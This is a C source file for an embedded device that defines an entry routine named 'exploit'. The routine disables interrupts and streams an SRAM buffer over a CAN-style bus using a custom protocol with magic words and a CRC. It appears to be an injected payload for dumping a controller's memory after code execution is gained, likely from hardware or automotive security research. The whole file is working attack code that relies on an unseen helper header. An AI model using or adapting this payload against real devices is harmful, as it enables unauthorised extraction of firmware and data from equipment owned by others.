#define RAM_ECHO_PAYLOAD 1
#include "patch_common.h"

static int send_ram_echo_stream(const struct runtime_guard *guard) {
  uint32_t crc;
  uint32_t header = ((uint32_t)PROTO_VERSION << 8)
    | ((uint32_t)PROTO_OP_RAM_ECHO << 16);

  if (can_send(PROTO_BEGIN0 | header, (uint32_t)SRAM_BUFFER, guard) != 0) return 1;
  if (can_send(
    PROTO_BEGIN1 | header | (1u << 24), TARGET_LENGTH, guard
  ) != 0) return 2;
  if (stream_sector(SRAM_BUFFER, guard, &crc) != 0) return 3;
  if (send_magic(0u, MAGIC_WORD, guard) != 0) return 4;
  if (send_magic(1u, MAGIC_WORD, guard) != 0) return 5;
  if (send_status(1u, guard) != 0) return 6;
  if (can_send(PROTO_END, crc, guard) != 0) return 7;
  return 0;
}

void exploit(void) __attribute__((section(".text.entry"),used,noreturn));
void exploit(void) {
  struct runtime_guard guard;
  uint32_t error;

  __asm__ volatile ("di");
  runtime_begin(&guard);
  error = (uint32_t)send_ram_echo_stream(&guard);
  if (error != 0u) {
    halt_with_error(PROTO_OP_RAM_ECHO, 1u, error, &guard);
  }
  runtime_end(&guard);
  for (;;) {
  }
}
